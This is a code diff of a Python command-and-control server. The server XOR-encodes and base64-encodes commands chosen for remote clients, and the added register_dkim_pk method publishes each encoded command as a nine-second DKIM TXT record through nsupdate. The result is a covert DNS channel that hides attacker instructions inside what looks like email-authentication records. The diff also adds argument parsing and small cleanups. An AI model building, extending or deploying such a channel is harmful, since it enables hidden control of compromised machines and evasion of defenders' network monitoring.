@@ -1,6 +1,9 @@
 #!/usr/bin/python
 # -*- coding: utf8 -*-
 
+import argparse
+import os
+import subprocess
 import sys
 import random
 import string
@@ -22,7 +25,7 @@ class Server:
         1: {
             'name': 'Print',
             'params':[
-                {'name': '*args', 'type': 'List', 'description': 'Any number of strings to print'}
+                {'name': '*args', 'type': 'list', 'description': 'Any number of strings to print'}
             ]
         },
         2: {
@@ -115,11 +118,13 @@ class Server:
         # Get a random character separator
         separator_ascii_repr = None
         separator = ''
+        # While the chosen separator character is inside any of the arguments
         while any([separator in x for x in args]):
+            # Get a random ASCII character
             separator_ascii_repr = random.randrange(len(Server.ASCII_VALUE_CHAR))
             separator = Server.ASCII_VALUE_CHAR[separator_ascii_repr]
 
-        # Get length of evaluable message, which are only the args plus 2 * number of args - 1
+        # Get length of evaluable message, which is only the args length plus 1 * number of args - 1
         util_evaluable_length = arguments_length + separators_need
 
         # Get the two characters that sum the divider ASCII representation
@@ -163,12 +168,12 @@ class Server:
 
         # If length of the key is greater than the message just get len(message) chars from the key
         if xor_key_length > util_evaluable_length:
-            aux = key[0:util_evaluable_length]
+            aux = key[:util_evaluable_length]
         # if util evaluable length is greater, add the key to itself until it has the same length
         elif util_evaluable_length > xor_key_length:
             number_of_additions = util_evaluable_length // xor_key_length
             partial_addition = util_evaluable_length % xor_key_length
-            aux = number_of_additions * key + key[0:partial_addition]
+            aux = number_of_additions * key + key[:partial_addition]
         # In ano other case, do not modify the key (if equal lengths
         else:
             aux = key
@@ -189,20 +194,47 @@ class Server:
         final_pk = non_xored_pk + xored_pk + key
 
         # Base64 encode
-        final_pk_e = base64.b64encode(bytes(final_pk, 'utf8')).decode('utf8')
+        final_pk_encoded = base64.b64encode(bytes(final_pk, 'utf8')).decode('utf8')
 
-        print('[+] Final PK non(B64): {}({} characters with {} bits)'.format(repr(final_pk), len(final_pk), len(final_pk) * 8))
-        print('[+] Final PK: {}({} characters with {} bits)'.format(repr(final_pk_e), len(final_pk_e), len(final_pk_e) * 8))
+        print('[+] Final PK non(B64): {}({} characters with {} bits)'.format(repr(final_pk), len(final_pk),
+                                                                             len(final_pk) * 8))
+        print('[+] Final PK: {}({} characters with {} bits)'.format(repr(final_pk_encoded), len(final_pk_encoded),
+                                                                    len(final_pk_encoded) * 8))
 
-        xored_pk = ''.join([chr(ord(a) ^ ord(b)) for (a, b) in zip(xored_pk, aux)])
-        print('[+] Back to original: {}'.format(repr(xored_pk)))
+        return final_pk_encoded
 
-        return final_pk_e
+    def register_dkim_pk(self, key_name, pk):
+        """ Register a PK uder a <key_name>._domainkey by adding a new  DNS TXT
+        record.
+
+            :param key_name: C2 client key name
+            :param pk: Encoded PK
+        """
+        with open('temp.txt', 'w') as f:
+            f.write('server ns1.text.com\n')
+            f.write('zone text.com\n')
+            # TODO: Test if semi-colon has to be escaped.
+            # Add the record for 9 seconds
+            f.write('update add {}._domainkey.text.com 9 TXT "v=DKIM1; g=*; k=rsa; p={};"\n'.format(key_name,pk))
+            f.write('send\n')
+
+        # Execute the update
+        command_exe = subprocess.Popen('nsupdate -k Ktest-key.+157+43149.private temp.txt'.split(),
+                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output, error = command_exe.communicate()
+        if output:
+            print('NSupdate output:\n{}'.format(output))
+        if error:
+            print('NSupdate ERROR;\n{}'.format(error))
+
+        # Delete the temp file
+        os.remove('temp.txt')
 
     def _serve_routine(self):
         """ Routine to re-execute any number of times
         """
         option = -1
+        key_name = input('[?] C2 client key name: ')
         while not option in Server.FUNCTION_REFERENCE:
             print('Choose a function to execute on client')
             for i, j in Server.FUNCTION_REFERENCE.items():
@@ -222,8 +254,10 @@ class Server:
                 params.extend(input('Value: ').split())
 
         print()
-        self.encode(str(option), *params)
+        dkim_pk = self.encode(str(option), *params)
         print()
+
+        self.register_dkim_pk(key_name, dkim_pk)
 
     def serve_forever(self):
         while True:
@@ -235,6 +269,17 @@ class Server:
 
 
 if __name__ == '__main__':
-    s = Server('example.com')
-    # s.encode(1, 'Hello World!', 'I am printing two strings!')
+
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument('-d','--domain',
+                        help="DNS server domain. Default: 'test.com'",
+                        required=False,
+                        default='test.com',
+                        dest='domain',
+                        type=str)
+
+    args = vars(parser.parse_args())
+
+    s = Server(args['domain'])
     s.serve_forever()
